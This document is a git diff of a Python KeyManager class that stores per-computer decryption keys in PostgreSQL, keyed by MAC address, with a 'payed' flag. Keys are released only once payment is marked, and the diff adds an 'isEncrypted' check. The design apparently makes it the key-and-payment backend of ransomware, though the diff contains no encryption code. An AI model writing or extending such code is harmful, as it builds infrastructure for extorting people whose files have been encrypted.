@@ -1,4 +1,5 @@
 import psycopg2
+from uuid import getnode as get_mac
 
 #sudo apt-get install python3-psycopg2
 
@@ -25,14 +26,14 @@ class KeyManager:
     def insertKey(self, computer_id, key):
         """Inserts key to the database with the computer_id"""
 
-        self.cursor.execute('INSERT INTO "public"."keys"(computer_id, key, payed) VALUES(%s, %s, %s)', (computer_id, key, "false"))
+        self.cursor.execute('INSERT INTO "public"."keys"(computer_id, key, payed) VALUES(%s, %s, %s)', (str(computer_id), key, "false"))
         self.connection.commit()
 
 
     def getKey(self, computer_id):
         """Gets a key from the database with given computer_id"""
 
-        self.cursor.execute('SELECT key FROM "public"."keys" WHERE computer_id = %s AND payed = TRUE', (computer_id,))
+        self.cursor.execute('SELECT key FROM "public"."keys" WHERE computer_id = %s AND payed = TRUE', (str(computer_id),))
         data = self.cursor.fetchall()
         if (data != []):
             key = data[0][0] #First row, first column. Should only return one row and column.
@@ -40,8 +41,20 @@ class KeyManager:
         return ''
 
     def pay(self, computer_id):
-        self.cursor.execute('UPDATE "public"."keys" set payed = true WHERE computer_id = %s', (computer_id,)) 
+        self.cursor.execute('UPDATE "public"."keys" set payed = true WHERE computer_id = %s', (str(computer_id),)) 
         self.connection.commit()
+
+    def isEncrypted(self, computer_id):
+        self.cursor.execute('SELECT * FROM "public"."keys" WHERE computer_id = %s', (str(computer_id),))
+        data = self.cursor.fetchall()
+        if (data != []):
+            return True
+        return False
+
+    def removeThisMacFromDB(self):
+        self.cursor.execute('DELETE FROM "public"."keys" WHERE computer_id = %s', (str(get_mac()),))
+        self.connection.commit()
+
 
 
 
